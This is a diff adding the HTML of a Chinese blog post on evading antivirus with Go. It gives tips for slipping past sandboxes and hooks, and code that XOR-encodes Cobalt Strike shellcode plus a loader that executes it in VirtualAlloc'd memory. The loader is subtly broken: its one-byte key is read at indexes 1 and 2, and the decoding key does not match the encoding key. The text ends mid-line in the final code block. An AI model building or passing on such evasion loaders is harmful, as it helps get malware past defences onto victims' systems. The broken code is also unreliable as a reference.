@@ -1,0 +1,494 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="前置知识 Shellcode：指一段机器指令的集合，通常会被压缩至很小的长度，达到为后续恶意代码铺垫的作用。 Raw：Raw文件是可以直接进行字节操作读取的，因此加载到内存较为方便。本文全部使用Cobaltstrike生成的bin文件   程序内存空间在冯诺依曼的体系结构中，一个进程必须有：Text 代码段、Data 数据段、BSS 堆栈段  Text（只读）：存放程序代码的区域，它是由编译器在编">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Go免杀初探">
+<meta property="og:url" content="https://www.m1r0ku.com/posts/Go%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2.html">
+<meta property="og:site_name" content="M1r0ku">
+<meta property="og:description" content="前置知识 Shellcode：指一段机器指令的集合，通常会被压缩至很小的长度，达到为后续恶意代码铺垫的作用。 Raw：Raw文件是可以直接进行字节操作读取的，因此加载到内存较为方便。本文全部使用Cobaltstrike生成的bin文件   程序内存空间在冯诺依曼的体系结构中，一个进程必须有：Text 代码段、Data 数据段、BSS 堆栈段  Text（只读）：存放程序代码的区域，它是由编译器在编">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://www.m1r0ku.com/assets/Go%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2-0.png">
+<meta property="og:image" content="https://www.m1r0ku.com/assets/Go%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2-1.png">
+<meta property="og:image" content="https://www.m1r0ku.com/assets/Go%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2-2.png">
+<meta property="article:published_time" content="2022-08-04T02:15:00.000Z">
+<meta property="article:modified_time" content="2023-02-18T17:21:38.032Z">
+<meta property="article:author" content="M1r0ku">
+<meta property="article:tag" content="Go">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://www.m1r0ku.com/assets/Go%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2-0.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Go免杀初探</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="M1r0ku" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+
+  <!-- FancyBox -->
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.css" />
+  
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/lists/">Lists</a></li><!--
+     --><!--
+       --><li><a href="/links/">Links</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/posts/Github%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E5%AF%BC%E8%87%B4%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://www.m1r0ku.com/posts/Go%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://www.m1r0ku.com/posts/Go%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2.html&text=Go免杀初探"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://www.m1r0ku.com/posts/Go%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2.html&title=Go免杀初探"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://www.m1r0ku.com/posts/Go%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2.html&is_video=false&description=Go免杀初探"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Go免杀初探&body=Check out this article: https://www.m1r0ku.com/posts/Go%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://www.m1r0ku.com/posts/Go%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2.html&title=Go免杀初探"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://www.m1r0ku.com/posts/Go%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2.html&title=Go免杀初探"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://www.m1r0ku.com/posts/Go%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2.html&title=Go免杀初探"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://www.m1r0ku.com/posts/Go%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2.html&title=Go免杀初探"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://www.m1r0ku.com/posts/Go%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2.html&name=Go免杀初探&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://www.m1r0ku.com/posts/Go%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2.html&t=Go免杀初探"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%86%85%E5%AD%98%E7%A9%BA%E9%97%B4"><span class="toc-number">1.1.</span> <span class="toc-text">程序内存空间</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E6%9D%80%E4%B8%8E%E5%85%8D%E6%9D%80"><span class="toc-number">1.2.</span> <span class="toc-text">查杀与免杀</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Go%E7%9B%B8%E5%85%B3"><span class="toc-number">1.3.</span> <span class="toc-text">Go相关</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Loader"><span class="toc-number">2.</span> <span class="toc-text">Loader</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E5%AF%86"><span class="toc-number">2.1.</span> <span class="toc-text">加密</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E5%AF%86"><span class="toc-number">2.2.</span> <span class="toc-text">解密</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Go免杀初探
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">M1r0ku</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-08-04T02:15:00.000Z" itemprop="datePublished">2022-08-04</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/Pentest/">Pentest</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/Go/" rel="tag">Go</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><ul>
+<li>Shellcode：指一段机器指令的集合，通常会被压缩至很小的长度，达到为后续恶意代码铺垫的作用。</li>
+<li>Raw：Raw文件是可以直接进行字节操作读取的，因此加载到内存较为方便。本文全部使用Cobaltstrike生成的<code>bin</code>文件</li>
+</ul>
+<p><a data-fancybox="gallery" data-src="/assets/Go%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2-0.png" data-caption="Go免杀初探-0"><img src="/assets/Go%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2-0.png" alt="Go免杀初探-0"></a></p>
+<h3 id="程序内存空间"><a href="#程序内存空间" class="headerlink" title="程序内存空间"></a>程序内存空间</h3><p>在冯诺依曼的体系结构中，一个进程必须有：Text 代码段、Data 数据段、BSS 堆栈段</p>
+<ul>
+<li>Text（只读）：存放程序代码的区域，它是由编译器在编译连接时自动计算的。</li>
+<li>Data（可读可写）：存放编译阶段（而非运行时）就能确定的数据，即通常所说的静态存储区。赋予初值的全局和静态变量、常量就是存在这个区域</li>
+<li>BSS（可读可写）：通常是用来存储未初始化或初始化为 0 的全局变量、静态变量的内存区域<ul>
+<li>Stack 栈：保存函数的局部变量和参数</li>
+<li>Heap 堆：保存函数内部动态分配内存，即程序的动态变量</li>
+</ul>
+</li>
+</ul>
+<p><a data-fancybox="gallery" data-src="/assets/Go%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2-1.png" data-caption="Go免杀初探-1"><img src="/assets/Go%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2-1.png" alt="Go免杀初探-1"></a></p>
+<ul>
+<li>函数指针：指向函数的指针变量。程序编译时，每一个函数都有一个入口地址，该入口地址就是函数指针所指向的地址。函数指针有两个用途：调用函数和作为函数的参数。</li>
+<li>函数指针声明：<code>void(*pFunction)()</code>，没有参数时可写成<code>void(*pFunction)(void)</code>。<ul>
+<li>那么<code>pFunction</code>函数指针的原型就是 <code>void (*)()</code>，即把变量名去掉</li>
+<li>对于一个给定的<code>entry</code>地址，要把它转换成为函数指针，就是<code>(void (*) ())entry</code></li>
+<li>那么调用这个函数指针的方式就是<code>((void(*)())entry)()</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="查杀与免杀"><a href="#查杀与免杀" class="headerlink" title="查杀与免杀"></a>查杀与免杀</h3><p>杀软通用的查杀姿势一般可以分为静态查杀、动态查杀以及云查杀，更好一点的杀软还拥有主动防御功能。</p>
+<ul>
+<li>静态查杀：主要有静态的签名查杀和启发式查杀<ul>
+<li>签名查杀：<ul>
+<li>从病毒体中提取的病毒特征码，逐个与程序文件比较</li>
+<li>特征码是反病毒公司在分析病毒时，确定的只有该病毒才可能会有的一系列二进制串，由这些特征可以识别出病毒程序</li>
+</ul>
+</li>
+<li>启发式查杀：虚拟机引擎和行为检测相结合，通过模拟执行， 分析程序行为的安全检测技术。</li>
+</ul>
+</li>
+<li>行为查杀：杀软一般是对系统多个API进行了hook，如：注册表操作、添加启动项、添加服务、添加用户、注入、创建进程、创建线程、加载DLL等等。杀软除了进行hook关键API，还会对API调用链进行监控，如：申请内存，将shellcode加载进内存，再执行内存区域shellcode。</li>
+<li>云查杀：<ul>
+<li>云安全机制是一种新兴的安全查杀机制，不同的安全厂商的云安全查杀机制不一样。</li>
+<li>360安全卫士基于云共享特征库扫描机制，电脑管家基于主动防御信誉云的扫描机制。</li>
+</ul>
+</li>
+</ul>
+<p>免杀</p>
+<ul>
+<li>静态免杀： 对抗基于特征的静态免杀比较简单，可以使用加壳改壳、添加&#x2F;替换资源文件、修改特征码、Shellcode 编码&#x2F;加密（AES&#x2F;DES&#x2F;Base64&#x2F;Xor），目的是去除ShellCode特征</li>
+<li>行为免杀：API 替换、使用未被 Hook 的 API、直接系统调用、替换操作方式采用白加黑手段等</li>
+</ul>
+<h3 id="Go相关"><a href="#Go相关" class="headerlink" title="Go相关"></a>Go相关</h3><blockquote>
+<p>Go编写的程序很多杀软都会报毒（哪怕是HelloWorld）</p>
+</blockquote>
+<ul>
+<li>Tips：编码这块可使用 Xor 异或，不需要引入额外的包。因为 Go 编写的 Loader 体积较大，再引入包会更大</li>
+<li>编译时经常会添加参数<code>-ldflags=&quot;-H windowsgui&quot;</code>，其作用是隐藏CMD窗口</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ go build -ldflags=<span class="string">&quot;-s -w -H=windowsgui&quot;</span> -o main.exe main.go</span><br><span class="line"></span><br><span class="line"><span class="comment"># -o 指定输出文件名</span></span><br><span class="line"><span class="comment"># -s -w 减小体积</span></span><br><span class="line"><span class="comment"># -H=windowsgui 隐藏窗口</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>默认<code>go build</code>的exe都是当前操作系统的可执行文件，如果需要跨平台，只需要指定目标操作系统的平台和处理器架构即可。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 编译当前操作系统的可执行文件</span></span><br><span class="line">$ go build main.go</span><br><span class="line">$ go build -o &lt;Other_Name&gt; main.go</span><br><span class="line"></span><br><span class="line"><span class="comment"># 【无弹窗】Mac编译exe</span></span><br><span class="line">$ CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc CXX=x86_64-w64-mingw32-g++ GOOS=windows GOARCH=amd64 go build -ldflags <span class="string">&quot;-s -w -H=windowsgui&quot;</span> main.go</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="Loader"><a href="#Loader" class="headerlink" title="Loader"></a>Loader</h2><ul>
+<li>Loader Tips：<ul>
+<li>加载DLL，采用动态调用的方式，可以避免 IAT 的 Hook</li>
+<li>不要直接申请 RWX (读写执行)的内存，可先申请 RW 内存，后面再改为可执行，杀软对 RWX 的内存很敏感</li>
+<li>加载到内存的方法非常多，除了常见的<code>copy</code>和<code>move</code>还有<code>uuid</code>这种加载既能达到加密Shellcode 的效果，还能直接加载到内存</li>
+<li>执行内存，还可以用回调来触发如 EnumChildWindows，参考：<a target="_blank" rel="noopener" href="https://github.com/aahmad097/AlternativeShellcodeExec">AlternativeShellcodeExec</a></li>
+<li>API调用中间可以插入一些没用的代码，打乱API调用</li>
+<li>适当加一些 sleep，可以过一些沙箱</li>
+</ul>
+</li>
+</ul>
+<h3 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h3><blockquote>
+<p>由于反病毒软件对于默认生成的文件查杀较为严格，所以需要先对其进行混淆加密，然后再通过解密还原</p>
+</blockquote>
+<ul>
+<li>这里使用XOR异或加密，加密部分可以自行修改，但后续解密部分需要做相应调整</li>
+</ul>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;encoding/base64&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> key = []<span class="type">byte</span>&#123;<span class="number">0x1b</span>, <span class="number">0x51</span>, <span class="number">0x11</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 异或混淆加密,然后进行Base64编码</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getEnCode</span><span class="params">(shellcode []<span class="type">byte</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">	<span class="keyword">var</span> xorShellcode []<span class="type">byte</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(shellcode); i++ &#123;</span><br><span class="line">		xorShellcode = <span class="built_in">append</span>(xorShellcode, shellcode[i]^key[<span class="number">2</span>]^key[<span class="number">1</span>])</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> base64.StdEncoding.EncodeToString(xorShellcode)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从文件中读取Shellcode</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getFileShellCode</span><span class="params">(file <span class="type">string</span>)</span></span> []<span class="type">byte</span> &#123;</span><br><span class="line">	shellcode, err := ioutil.ReadFile(file)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Print(err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> shellcode</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	shellcode := getFileShellCode(<span class="string">&quot;payload.bin&quot;</span>)</span><br><span class="line">	fmt.Println(getEnCode(shellcode))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>bin文件太大的话，加密后的字符会很多，可以重定向到文件中</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ go run xor_shellcode.go &gt; xor.txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h3><p>Shellcode的执行步骤：首先需要通过Loader加载器去申请一块内存，然后使用将Shellcode加载到这块内存：中，最后执行这块内存。</p>
+<ul>
+<li>首先定义用到的函数和变量</li>
+</ul>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> (</span><br><span class="line">	MEM_COMMIT             = <span class="number">0x1000</span></span><br><span class="line">	MEM_RESERVE            = <span class="number">0x2000</span></span><br><span class="line">	PAGE_EXECUTE_READWRITE = <span class="number">0x40</span>  <span class="comment">// 区域可以执行代码，应用程序可以读写该区域。</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> kk = []<span class="type">byte</span>&#123;<span class="number">0x21</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">	kernel32      = syscall.MustLoadDLL(<span class="string">&quot;kernel32.dll&quot;</span>)</span><br><span class="line">	ntdll         = syscall.MustLoadDLL(<span class="string">&quot;ntdll.dll&quot;</span>)</span><br><span class="line">	VirtualAlloc  = kernel32.MustFindProc(<span class="string">&quot;VirtualAlloc&quot;</span>)</span><br><span class="line"><span class="comment">// RtlMoveMemory = ntdll.MustFindProc(&quot;RtlMoveMemory&quot;)</span></span><br><span class="line">    RtlCopyMemory = ntdll.MustFindProc(<span class="string">&quot;RtlCopyMemory&quot;</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>编写Shellcode的解密代码，还原恶意载荷</li>
+</ul>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getDeCode</span><span class="params">(src <span class="type">string</span>)</span></span> []<span class="type">byte</span> &#123;</span><br><span class="line">	ss, _ := base64.StdEncoding.DecodeString(src)</span><br><span class="line">	<span class="keyword">var</span> shellcode []<span class="type">byte</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(ss); i++ &#123;</span><br><span class="line">		shellcode = <span class="built_in">append</span>(shellcode, ss[i]^kk[<span class="number">1</span>]^kk[<span class="number">2</span>])</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> shellcode</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>申请内存，然后加载Shellcode到申请的内存块并执行</li>
+</ul>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 此处填写前面混淆后的Shellcode</span></span><br><span class="line">	<span class="keyword">var</span> shellcode = <span class="string">&quot;&lt;Shellcode&gt;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 解密Shellcode</span></span><br><span class="line">	charcode := getDeCode(shellcode)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 申请内存</span></span><br><span class="line">	addr, _, err := VirtualAlloc.Call(<span class="number">0</span>, <span class="type">uintptr</span>(<span class="built_in">len</span>(charcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; err.Error() != <span class="string">&quot;The operation completed successfully.&quot;</span> &#123;</span><br><span class="line">		syscall.Exit(<span class="number">0</span>)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 加载Shellcode</span></span><br><span class="line">	_, _, err = RtlCopyMemory.Call(addr, (<span class="type">uintptr</span>)(unsafe.Pointer(&amp;charcode[<span class="number">0</span>])), <span class="type">uintptr</span>(<span class="built_in">len</span>(charcode)))</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; err.Error() != <span class="string">&quot;The operation completed successfully.&quot;</span> &#123;</span><br><span class="line">		syscall.Exit(<span class="number">0</span>)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 执行内存</span></span><br><span class="line">	syscall.Syscall(addr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>完整代码：</li>
+</ul>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;encoding/base64&quot;</span></span><br><span class="line">	<span class="string">&quot;syscall&quot;</span></span><br><span class="line">	<span class="string">&quot;unsafe&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">	MEM_COMMIT             = <span class="number">0x1000</span></span><br><span class="line">	MEM_RESERVE            = <span class="number">0x2000</span></span><br><span class="line">	PAGE_EXECUTE_READWRITE = <span class="number">0x40</span> <span class="comment">// 区域可以执行代码，应用程序可以读写该区域。</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> kk = []<span class="type">byte</span>&#123;<span class="number">0x21</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">	kernel32     = syscall.MustLoadDLL(<span class="string">&quot;kernel32.dll&quot;</span>)</span><br><span class="line">	ntdll        = syscall.MustLoadDLL(<span class="string">&quot;ntdll.dll&quot;</span>)</span><br><span class="line">	VirtualAlloc = kernel32.MustFindProc(<span class="string">&quot;VirtualAlloc&quot;</span>)</span><br><span class="line">	<span class="comment">// RtlMoveMemory = ntdll.MustFindProc(&quot;RtlMoveMemory&quot;)</span></span><br><span class="line">	RtlCopyMemory = ntdll.MustFindProc(<span class="string">&quot;RtlCopyMemory&quot;</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Shellcode解密</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getDeCode</span><span class="params">(src <span class="type">string</span>)</span></span> []<span class="type">byte</span> &#123;</span><br><span class="line">	ss, _ := base64.StdEncoding.DecodeString(src)</span><br><span class="line">	<span class="keyword">var</span> shellcode []<span class="type">byte</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(ss); i++ &#123;</span><br><span class="line">		shellcode = <span class="built_in">append</span>(shellcode, ss[i]^kk[<span class="number">1</span>]^kk[<span class="number">2</span>])</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> shellcode</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 此处填写前面混淆后的Shellcode</span></span><br><span class="line">	<span class="keyword">var</span> shellcode = <span 